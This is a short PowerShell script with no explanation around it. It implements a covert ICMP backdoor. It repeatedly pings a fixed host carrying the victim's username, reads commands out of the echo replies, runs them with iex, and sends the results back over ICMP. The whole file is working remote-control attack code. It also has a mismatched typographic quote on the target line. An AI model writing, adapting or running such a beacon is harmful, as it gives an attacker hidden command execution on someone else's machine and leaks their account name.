$sleep = 10; $target = ”192.168.55.5"
while ($true) {
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $r=$ICMPClient.Send($target, 10, ([text.encoding]::ASCII).GetBytes($env:USERNAME)) 
    $r=[System.Text.Encoding]::ASCII.GetString($r.Buffer)
    if ($r -match "^c:(..*)$") {
        $out = iex $matches[1] 2>&1|out-string
        $ICMPClient.Send($target, 10, ([text.encoding]::ASCII).GetBytes("r:$out")) 
    }
    start-sleep $sleep
}
